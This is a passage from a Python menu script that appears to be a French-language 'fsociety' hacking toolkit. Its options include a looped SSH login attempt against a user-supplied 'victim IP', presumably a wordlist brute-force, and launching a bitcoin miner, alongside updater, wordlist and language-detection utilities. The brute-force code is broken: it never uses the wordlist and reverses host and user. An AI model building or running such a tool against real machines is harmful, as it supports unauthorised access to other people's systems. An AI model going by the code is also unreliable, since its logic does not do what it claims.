                    t.sleep(0.2)
            if choice == "19":
                with open(words, 'r') as f:
                    lines = f.readlines()
                ip = input('ip de la victime : ')
                while True:
                    try:
                        for i, line in enumerate(lines):
                            try:
                                os.system(f'ssh {ip}@{user}')
                            except:
                                pass
                    except:
                        pass
            if choice == "20":
                publicip = Ip.getip.write_publicip()
            if choice == "21":
                try:
                    os.system('start miner.py')
                except:
                    print('you can\'t mine bitcoin because you have\'t the miner module installed')
                    time.sleep(0.2)
            if choice == "22":
                try:
                    os.startfile('updater.exe')
                    exit()
                except:
                    try:
                        os.startfile('updater.py')
                        exit()
                    except:
                        print('une erreur est survenu, le fichier n\'existe pas ou n\'est pas a C:/fsociety/updater.exe')
                        time.sleep(0.2)
            if choice == "23":
                try:
                    with open('version.txt', 'r') as f:
                        version = int(f.read())
                        print(f'the tools version is  {version}')

                except:
                    print('version  not found or version isn\'t an int !') 
                time.sleep(2)
            if choice == "24":
                os.system('python3 passstarter.py')
            if choice == "25":
                print('la langue est ', detect_language(input('veuillez entrer le texte a détécter : ')))
                time.sleep(2)
            if choice == "26":
                def add_words_to_file(words, filename):
                    i=0
                    with open(filename, 'a') as file:
                        for word in words:
                            file.write('\n'+word)
                            i+=1
                    return i
                choice = input('do you want to do it with a file ? (y/N)')
                if choice in ('Y', 'y', 'yes', 'YES'):
                    try:    
                        with open('text.txt', 'r', encoding='utf-8') as txt:
                            file = txt.read()
                            file = file.split()
                            print(f'{add_words_to_file(file, words)} mot ont été ajoutées')
                    except:
                        with open('text.txt','w+',encoding='utf-8') as f:
                            f.close()
                            print("le fichier a été créer veuillez recommencer en entrant votre texte dedans a C:/fsociety/text.txt")
                            os.startfile('text.txt')
                            time.sleep(2)
                else: 
                    print(f'{add_words_to_file(input("Entrez les mots à ajouter (séparés par des espaces) : ").split(), words)} mot ont été ajoutées')
                time.sleep(2)
    except Exception as e:
        try:
            with open(f'C:/Users/{getpass.getuser()}/desktop/error log.txt', 'a') as f:
                now = dt.now().strftime("%d/%m/%Y, %H:%M:%S")
                err = {"time" : now , "errtype" : str(sys.exc_info()[0]) , e : str(sys.exc_info()[1])}
                f.write("\n"+str(err))
        except:
            with open(f'/home{getpass.getuser()}/desktop/error log.txt', 'a') as f:
                now = dt.now().strftime("%d/%m/%Y, %H:%M:%S")
                err = {"time" : now , "errtype" : str(sys.exc_info()[0]) , e : str(sys.exc_info()[1])}
                f.write("\n"+str(err))
        error+=1
